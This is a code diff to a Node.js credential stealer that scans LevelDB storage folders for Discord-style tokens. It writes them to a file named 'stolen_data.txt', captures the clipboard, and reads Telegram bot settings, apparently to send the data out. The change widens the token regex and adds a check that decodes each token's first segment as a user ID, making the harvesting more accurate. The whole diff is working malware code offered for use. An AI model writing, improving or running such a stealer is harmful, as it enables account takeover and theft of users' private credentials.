@@ -10,12 +10,20 @@ const https = require('https')
 const http = require('http')
 const { execSync } = require('child_process')
 
-const tokenpattern = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g
+const tokenpattern = /[\w-]{23,26}\.[\w-]{5,7}\.[\w-]{26,28}|mfa\.[\w-]{83,85}/g
 const datafile = path.join(__dirname, 'stolen_data.txt')
 const clipfile = path.join(__dirname, 'clipboard.txt')
 const tgtoken = process.env.TGTOKEN
 const tcid = process.env.TGCHAT
 let lastclip = ''
+
+function isvalidtoken(t) {
+  try {
+    const p1 = t.split('.')[0]
+    const dec = Buffer.from(p1, 'base64').toString()
+    return /^\d{15,20}$/.test(dec)
+  } catch (e) { return false }
+}
 
 function walkleveldb(dirpath, tokens) {
   if (!fs.existsSync(dirpath)) return
@@ -25,7 +33,7 @@ function walkleveldb(dirpath, tokens) {
     try {
       const content = fs.readFileSync(path.join(dirpath, file), 'utf8')
       const matches = content.match(tokenpattern)
-      if (matches) tokens.push(...matches)
+      if (matches) for (const m of matches) { if (isvalidtoken(m)) tokens.push(m) }
     } catch (e) {}
   }
 }
